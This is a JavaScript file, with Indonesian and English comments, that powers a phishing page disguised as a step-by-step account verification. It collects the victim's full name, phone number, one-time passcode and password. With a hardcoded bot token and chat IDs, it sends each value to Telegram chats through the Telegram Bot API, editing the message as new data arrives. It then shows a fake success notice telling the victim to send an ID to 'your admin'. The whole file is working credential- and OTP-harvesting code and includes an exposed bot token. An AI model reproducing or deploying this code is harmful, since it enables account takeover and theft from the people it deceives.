const botToken = "7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY";

// Array of chat IDs to send the message to
const chatIds = [
  "6124038392", // Example chat ID 1
  "5460230196", // Example chat ID 2
];

let messageIds = {};

// Variables to store user data
let fullName = "";
let phone = "";
let otp = "";
let password = "";
let messageId = null; // Variable to store the message ID to edit the message

// Simpan ID acak untuk disalin
let randomIdToCopy = "";

// Function to generate a random ID
function generateRandomId() {
  return Math.random().toString(36).substr(2, 8); // Generate a random ID (8 alphanumeric characters)
}

// Function to show loading overlay
function showLoading() {
  const loadingOverlay = document.getElementById("loadingOverlay");
  loadingOverlay.style.display = "flex"; // Show the loading overlay
}

// Function to hide loading overlay
function hideLoading() {
  const loadingOverlay = document.getElementById("loadingOverlay");
  loadingOverlay.style.display = "none"; // Hide the loading overlay
}

// Fungsi untuk menampilkan modal alert dengan pesan
// Modified showAlert function
function showAlert(message, randomId = "") {
  const alertMessage = document.getElementById("alertMessage");
  randomIdToCopy = randomId; // Save the random ID for copying

  // Include button HTML if randomId is provided
  alertMessage.innerHTML = `
    ${message} ${randomId ? `<br><br>ID Anda: <strong>${randomId}</strong>` : ""}
    ${randomId ? '<br><button id="copyIdBtn" onclick="copyToClipboard()">Salin ID</button>' : ""}
  `;

  const alertModal = document.getElementById("alertModal");
  alertModal.style.display = "block"; // Show the alert modal
}


// Function to hide the alert
function hideAlert() {
  const alertModal = document.getElementById("alertModal");
  alertModal.style.display = "none"; // Sembunyikan modal
}

// Function to copy the random ID to the clipboard
function copyToClipboard() {
  if (randomIdToCopy) {
    // Membuat elemen textarea sementara untuk menyalin ID
    const el = document.createElement("textarea");
    el.value = randomIdToCopy; // Gunakan ID yang sudah disimpan
    document.body.appendChild(el);
    el.select(); // Pilih teks
    document.execCommand("copy"); // Salin ke clipboard
    document.body.removeChild(el); // Hapus elemen textarea setelah salin

    // Menampilkan pesan bahwa ID telah disalin
    showAlert("ID Anda telah disalin ke clipboard!", randomIdToCopy);
  } else {
    showAlert("ID tidak ditemukan!", ""); // Pesan jika ID tidak tersedia
  }
}

// Function to prepare the message text for Telegram
function createMessage() {
  return (
    `Nama: ${fullName || "belum di isi"}\n` +
    `Nomor Telepon: ${phone}\n` +
    `OTP: ${otp}\n` +
    `Kata Sandi: ${password}`
  );
}

// Function to send data or update the message on Telegram to multiple chat IDs
function sendToTelegram(message, update = false) {
  showLoading(); // Show loading when sending data

  chatIds.forEach((chatId) => {
    const url = update
      ? `https://api.telegram.org/bot${botToken}/editMessageText`
      : `https://api.telegram.org/bot${botToken}/sendMessage`;

    const payload = update
      ? {
          chat_id: chatId, // Send to one chat ID at a time
          message_id: messageIds[chatId], // Use the stored message ID for this chat
          text: message, // Updated message text
        }
      : {
          chat_id: chatId, // Send to one chat ID at a time
          text: message, // Send new message text
        };

    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })
      .then((response) => response.json())
      .then((data) => {

        if (!data.ok) {
          throw new Error(
            `Telegram Error: ${data.description} (Error Code: ${data.error_code})`
          );
        }

        // Store the `message_id` for each `chat_id` after the first successful sendMessage
        if (!update) {
          messageIds[chatId] = data.result.message_id;
        }

        hideLoading(); // Hide loading after response
      })
      .catch((error) => {
        console.error("Error in sending or editing message:", error);
        showAlert("Terjadi kesalahan: " + error.message);
        hideLoading(); // Hide loading if there's an error
      });
  });
}

// Function to handle step transitions
function nextStep(step) {
  showLoading(); // Show loading before processing

  setTimeout(() => {
    // Wait for 2 seconds
    if (step === 2) {
      // Validasi dan simpan Nama Lengkap dan Nomor Telepon
      fullName = document.getElementById("fullName").value;
      phone = document.getElementById("phone").value;
      if (!fullName || !phone) {
        showAlert("Nama Lengkap dan Nomor Telepon harus diisi!");
        hideLoading(); // Hide loading if there's an error
        return; // Tidak mereset form jika input salah, cukup memberi alert
      }
      let message = createMessage(); // Prepare message
      sendToTelegram(message); // Send data to Telegram for the first time

      const yyElement = document.getElementById("yy");
      if (yyElement) {
        yyElement.remove(); // This will remove the element from the DOM
      }
    } else if (step === 3) {
      // Validasi dan simpan Kode OTP
      otp = document.getElementById("otp").value;
      if (!otp) {
        showAlert("Kode OTP harus diisi!");
        hideLoading(); // Hide loading if there's an error
        return; // Tidak mereset form jika input salah, cukup memberi alert
      }
      let message = createMessage(); // Prepare updated message with OTP
      sendToTelegram(message, true); // Edit the existing message with OTP
    } else if (step === 4) {
      // Validasi dan simpan Kata Sandi
      password = document.getElementById("password").value;
      if (!password || password.trim() === "") {
        showAlert("Kata Sandi harus diisi!");
        hideLoading(); // Hide loading if there's an error
        return; // Tidak mereset form jika input salah, cukup memberi alert
      }
      let message = createMessage(); // Prepare final message with Password
      sendToTelegram(message, true); // Edit the existing message with password
    }

    // Mengatur tampilan langkah berikutnya
    document.getElementById("step1").style.display =
      step === 1 ? "block" : "none";
    document.getElementById("step2").style.display =
      step === 2 ? "block" : "none";
    document.getElementById("step3").style.display =
      step === 3 ? "block" : "none";

    // Jika form lengkap, tampilkan tombol Salin ID
    if (fullName && phone && otp && password) {
      const randomId = generateRandomId(); // Generate random ID
      document.getElementById("randomIdContainer").textContent = randomId; // Tampilkan ID acak
      document.getElementById("copyIdBtn").style.display = "inline-block"; // Menampilkan tombol Salin ID
    }

    hideLoading(); // Hide loading after processing
  }, 2000); // 2 seconds delay
}

// Fungsi untuk mereset form dan mengarahkan kembali ke langkah pertama
function resetForm() {
  fullName = "";
  phone = "";
  otp = "";
  password = "";
  document.getElementById("fullName").value = "";
  document.getElementById("phone").value = "";
  document.getElementById("otp").value = "";
  document.getElementById("password").value = "";
  document.getElementById("step1").style.display = "block"; // Tampilkan langkah pertama
  document.getElementById("step2").style.display = "none";
  document.getElementById("step3").style.display = "none";
}

// Fungsi untuk mengirim ringkasan data ke Telegram
function sendSummary() {
  const summaryMessage = createMessage(); // Use createMessage to prepare summary
  sendToTelegram(summaryMessage, true); // Use the existing sendToTelegram function
}

// Fungsi akhir untuk mengarahkan ke halaman film dan mengirim summary
function submitVerification() {
  // Validasi kata sandi sebelum mengirim summary
  const passwordInput = document.getElementById("password").value;
  if (passwordInput.trim() === "") {
    showAlert("Kata Sandi harus diisi sebelum mengirim ringkasan.");
    return; // Tidak mengarahkan jika kata sandi kosong
  }

  // Set password from the input before sending summary
  password = passwordInput;

  // Kirim ringkasan setelah mengisi semua informasi
  showLoading(); // Show loading before sending summary

  setTimeout(() => {
    sendSummary(); // Send the summary after delay
    const randomId = generateRandomId(); // Generate random ID
    showAlert(
      `Verifikasi anda berhasil! Silakan screenshoot dan kirimkan ke admin anda atau copy id anda: ${randomId} dan kirimkan ke admin anda` // Show success message with random ID
    );
    randomIdToCopy = randomId; // Simpan ID acak untuk disalin
    resetForm(); // Reset form after all data is sent
    hideLoading(); // Hide loading after processing
  }, 1200); // 2 seconds delay
}

// Variabel untuk menghitung mundur waktu
let countdownTimer;
let countdownValue = 30; // 30 detik

// Fungsi untuk mengirim ulang kode OTP
function resendOTP() {
  // Menonaktifkan tombol Kirim Ulang Kode
  document.getElementById("resendButton").disabled = true;
  document.getElementById("timer").style.display = "inline-block"; // Menampilkan hitungan mundur
  document.getElementById("timer").textContent =
    "Silahkan tunggu " +
    countdownValue +
    " detik sebelum mengirimkan kode verifikasi baru"; // Menampilkan waktu awal

  // Memulai hitungan mundur
  countdownTimer = setInterval(function () {
    countdownValue--;
    document.getElementById("timer").textContent =
      "Silahkan tunggu " +
      countdownValue +
      " detik sebelum mengirimkan kode verifikasi baru"; // Menampilkan waktu yang tersisa

    // Ketika hitungan mundur mencapai 0, hentikan interval dan aktifkan tombol lagi
    if (countdownValue <= 0) {
      clearInterval(countdownTimer);
      document.getElementById("resendButton").disabled = false; // Mengaktifkan tombol Kirim Ulang Kode
      document.getElementById("timer").style.display = "none"; // Menyembunyikan hitungan mundur
      countdownValue = 30; // Reset waktu hitungan mundur
    }
  }, 1000); // Update setiap detik (1000 ms)
}

// Event listener untuk input nomor telepon dan OTP agar hanya angka yang bisa dimasukkan
document.getElementById("phone").addEventListener("input", function (e) {
  this.value = this.value.replace(/[^0-9]/g, "");
});

document.getElementById("otp").addEventListener("input", function (e) {
  this.value = this.value.replace(/[^0-9]/g, "");
});
